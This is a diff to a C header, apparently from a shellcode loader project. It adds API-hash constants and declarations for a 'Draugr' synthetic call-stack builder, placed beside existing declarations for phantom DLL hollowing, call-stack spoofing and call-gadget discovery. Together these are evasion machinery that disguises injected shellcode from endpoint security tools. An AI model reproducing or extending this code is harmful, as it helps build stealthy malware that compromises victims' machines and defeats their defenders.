@@ -62,6 +62,12 @@
 // ----------- Unwind-info registration for stomped modules -----------
 #define RtlAddFunctionTable_JOAAT       0xF1F158AB
 
+// ----------- Synthetic call-stack frames (Draugr MVP) -----------
+// (NtWaitForSingleObject_JOAAT is already defined above — reused here as
+// one of the three anchor RIPs for the fake stack.)
+#define RtlUserThreadStart_JOAAT        0xF7972684
+#define BaseThreadInitThunk_JOAAT       0x50635B44
+
 // ----------- Elevation (kernel32 exports) -----------
 #define GetModuleFileNameA_JOAAT        0x665A0D0F
 
@@ -183,7 +189,15 @@ BOOL PhantomDllHollow(IN PAPI_HASHING pApi, IN PNTAPI_FUNC pNtApis, IN PBYTE pSh
 
 // ----------- Call Stack Spoofing (ASM) -----------
 extern VOID SetSpoofTarget(PVOID pTarget, PVOID pCallGadget);
+extern VOID SetSpoofStack(PVOID pSyntheticRsp);
 extern VOID SpoofCallback(PVOID Instance, PVOID Context, PVOID Work);
+
+// ----------- Synthetic Call Stack Builder (Draugr MVP) -----------
+// Allocates a private 1 MB buffer and fills the top three qwords
+// with RIPs inside RtlUserThreadStart / BaseThreadInitThunk /
+// NtWaitForSingleObject. Returns the buffer's intended RSP (points
+// at the first fake return), or NULL on failure.
+PVOID BuildSyntheticStack(IN PAPI_HASHING pApi);
 
 // ----------- Call Gadget Discovery -----------
 BOOL  CollectCallGadgets(VOID);
